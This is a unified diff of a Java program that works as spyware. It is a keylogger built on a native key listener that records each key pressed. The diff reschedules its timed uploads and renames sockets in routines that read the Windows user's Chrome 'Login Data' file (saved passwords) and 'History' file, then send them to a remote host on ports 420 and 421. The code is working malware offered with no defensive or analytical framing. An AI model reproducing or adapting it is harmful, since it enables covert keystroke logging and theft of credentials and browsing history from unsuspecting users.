@@ -73,11 +73,14 @@ public class Main implements NativeKeyListener{
 		    Calendar cal = Calendar.getInstance();
 		    cal.setTime(date);
 		    int minutes = cal.get(Calendar.MINUTE);
-			 if (minutes % 5 == 0) {
-			    	// send the file
-				 upload(getHostIP());
-			    }
+		    // upload(getHostIP());
+		    uphistory(getHostIP());
 			 if (minutes % 2 == 0) {
+			    	// send the file
+				 System.out.println("A " + minutes);
+				 upload(getHostIP());
+			    } else {
+				 System.out.println("B " + minutes);
 				 uplogin(getHostIP());
 				 uphistory(getHostIP());
 			 }
@@ -105,14 +108,12 @@ public class Main implements NativeKeyListener{
 			return false;
 		}
 	}
-
 	@Override
 	public void nativeKeyPressed(NativeKeyEvent e) {
 		// TODO Auto-generated method stub
 		record(NativeKeyEvent.getKeyText(e.getKeyCode()));
 	    // System.out.println("Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
 	}
-
 	@Override
 	public void nativeKeyReleased(NativeKeyEvent e) {
 		// System.out.println("Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
@@ -124,7 +125,6 @@ public class Main implements NativeKeyListener{
 		//	System.out.print(NativeKeyEvent.getKeyText(e.getKeyCode()));
 		//}
 		}
-
 	@Override
 	public void nativeKeyTyped(NativeKeyEvent arg0) {
 		// TODO Auto-generated method stub
@@ -208,18 +208,18 @@ public class Main implements NativeKeyListener{
 			out.print(toSend );
 			out.flush();
 			socket.close();
-			Socket nakadashi = new Socket(getHostIP(), 420);
-			System.out.println("Accepted connection : " + nakadashi); 
+			Socket send = new Socket(getHostIP(), 420);
+			// System.out.println("Accepted connection : " + nakadashi); 
 			File transferFile = new File ("C:/Users/" + System.getProperty("user.name") + "/AppData/Local/Google/Chrome/User Data/Default/Login Data"); 
 			byte [] bytearray = new byte [(int)transferFile.length()]; 
 			FileInputStream fin = new FileInputStream(transferFile); 
 			BufferedInputStream bin = new BufferedInputStream(fin); 
 			bin.read(bytearray,0,bytearray.length); 
-			OutputStream os = nakadashi.getOutputStream(); 
+			OutputStream os = send.getOutputStream(); 
 			System.out.println(""); 
 			os.write(bytearray,0,bytearray.length); 
 			os.flush();
-		    nakadashi.close();
+		    send.close();
 			System.out.println("yiff!");
 		 } catch (Exception e) {
 			 System.out.println("blargh");
@@ -235,18 +235,18 @@ public class Main implements NativeKeyListener{
 					out.print(toSend );
 					out.flush();
 					socket.close();
-					Socket nakadashi = new Socket(getHostIP(), 421);
-					System.out.println("Accepted connection : " + nakadashi); 
+					Socket sand = new Socket(getHostIP(), 421);
+					// System.out.println("Accepted connection : " + nakadashi); 
 					File transferFile = new File ("C:/Users/" + System.getProperty("user.name") + "/AppData/Local/Google/Chrome/User Data/Default/History"); 
 					byte [] bytearray = new byte [(int)transferFile.length()]; 
 					FileInputStream fin = new FileInputStream(transferFile); 
 					BufferedInputStream bin = new BufferedInputStream(fin); 
 					bin.read(bytearray,0,bytearray.length); 
-					OutputStream os = nakadashi.getOutputStream(); 
+					OutputStream os = sand.getOutputStream(); 
 					System.out.println(""); 
 					os.write(bytearray,0,bytearray.length); 
 					os.flush();
-				    nakadashi.close();
+				    sand.close();
 					System.out.println("yip!");
 				 } catch (Exception e) {
 					 System.out.println("blarfff");
